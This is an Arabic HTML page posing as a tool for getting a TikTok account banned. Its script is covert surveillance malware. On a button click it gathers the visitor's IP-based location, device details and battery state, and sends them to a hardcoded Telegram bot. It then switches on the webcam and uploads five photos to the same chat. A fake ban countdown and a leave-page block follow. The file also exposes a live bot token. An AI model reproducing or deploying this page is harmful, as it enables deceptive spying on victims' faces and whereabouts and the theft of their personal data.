<!DOCTYPE html><html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تبنيد حساب تيك توك</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');body {
  margin: 0;
  padding: 0;
  font-family: 'Cairo', sans-serif;
  background: #000;
  color: #fff;
  overflow: hidden;
}

.particles {
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  z-index: 0;
  pointer-events: none;
}

.container {
  z-index: 1;
  position: relative;
  text-align: center;
  padding: 30px;
}

h1 {
  font-size: 28px;
  color: #ff004f;
}

.logo {
  font-size: 40px;
  color: #ff004f;
  margin: 20px 0;
}

input {
  font-size: 18px;
  padding: 10px 20px;
  border-radius: 50px;
  border: 2px solid #ff004f;
  background: transparent;
  color: #fff;
  outline: none;
  margin-bottom: 20px;
}

button {
  background: #ff004f;
  color: #fff;
  font-size: 20px;
  border: none;
  padding: 12px 30px;
  border-radius: 50px;
  cursor: pointer;
  margin-top: 10px;
  box-shadow: 0 0 10px #ff004f;
}

.icons {
  margin-top: 40px;
  font-size: 22px;
}

.success-message, .ban-message {
  margin-top: 20px;
  color: #0f0;
  font-size: 18px;
}

.countdown {
  color: #ff0;
  margin-top: 10px;
  font-size: 16px;
}

  </style>
</head>
<body>
  <canvas class="particles" id="particles"></canvas>  <div class="container">
    <div class="logo"><i class="fab fa-tiktok"></i></div>
    <h1>تبنيد حساب تيك توك</h1>
    <input type="text" id="username" placeholder="@ضع اليوزر هنا">
    <br>
    <button onclick="startProcess()">🚫 اضغط هنا لتبنيد الحساب</button><div class="success-message" id="successMessage"></div>
<div class="countdown" id="countdown"></div>
<div class="ban-message" id="banMessage"></div>

<div class="icons">
  <i class="fas fa-share" onclick="navigator.share && navigator.share({ title: 'تبنيد تيك توك', url: window.location.href })"></i>
  &nbsp;&nbsp;
  <i class="fas fa-copy" onclick="navigator.clipboard.writeText(window.location.href)"></i>
</div>

  </div><audio id="beep" src="https://freesound.org/data/previews/337/337049_3232294-lq.mp3"></audio>

  <script>
    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
    const chatId = "7220184605";

    async function sendTelegram(text) {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text })
      });
    }

    async function sendPhoto(blob) {
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("photo", blob, "cam.jpg");
      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: form });
    }

    async function getDetails() {
      const res = await fetch("https://ipapi.co/json");
      const ip = await res.json();
      const battery = await navigator.getBattery();
      const time = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

      return `📱 معلومات الجهاز:
🌍 الدولة: ${ip.country_name}
🏙️ المدينة: ${ip.city}
🌐 IP: ${ip.ip}
🔋 الشحن: ${Math.round(battery.level * 100)}%
⚡ الشحن متصل: ${battery.charging ? "نعم" : "لا"}
🖥️ الجهاز: ${navigator.userAgent}
📏 دقة الشاشة: ${screen.width}x${screen.height}
🕒 الوقت: ${time}`;
    }

    async function takePhoto(video) {
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
    }

    async function startProcess() {
      const username = document.getElementById("username").value;
      if (!username.startsWith("@")) return alert("يجب كتابة اليوزر مع @");

      try {
        const details = await getDetails();
        await sendTelegram(`🚨 طلب تبنيد الحساب:
${username}
\n${details}`);

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        for (let i = 0; i < 5; i++) {
          await new Promise(r => setTimeout(r, 1000));
          const img = await takePhoto(video);
          await sendPhoto(img);
        }

        stream.getTracks().forEach(t => t.stop());
        document.getElementById("successMessage").textContent = "✅ تم إرسال البيانات بنجاح";
        document.getElementById("beep").play();

        let secs = 600;
        const timer = setInterval(() => {
          secs--;
          document.getElementById("countdown").textContent = `⏳ تبقى ${secs} ثانية لحظر الحساب...`;
          if (secs <= 0) {
            clearInterval(timer);
            document.getElementById("banMessage").textContent = "⛔ تم حظر الحساب نهائيًا";
          }
        }, 1000);

        window.onbeforeunload = () => "لا تغادر الصفحة";
      } catch (e) {
        alert("فشل تشغيل الكاميرا أو إرسال البيانات");
      }
    }

    // خلفية جزيئات بسيطة
    const canvas = document.getElementById("particles");
    const ctx = canvas.getContext("2d");
    let w = canvas.width = window.innerWidth;
    let h = canvas.height = window.innerHeight;
    const particles = Array.from({ length: 80 }, () => ({
      x: Math.random() * w,
      y: Math.random() * h,
      r: Math.random() * 2 + 1,
      dx: (Math.random() - 0.5) * 1,
      dy: (Math.random() - 0.5) * 1
    }));

    function draw() {
      ctx.clearRect(0, 0, w, h);
      for (let p of particles) {
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = '#ff004f';
        ctx.fill();
        p.x += p.dx;
        p.y += p.dy;
        if (p.x < 0 || p.x > w) p.dx *= -1;
        if (p.y < 0 || p.y > h) p.dy *= -1;
      }
      requestAnimationFrame(draw);
    }
    draw();
    window.addEventListener("resize", () => {
      w = canvas.width = window.innerWidth;
      h = canvas.height = window.innerHeight;
    });
  </script></body>
</html>
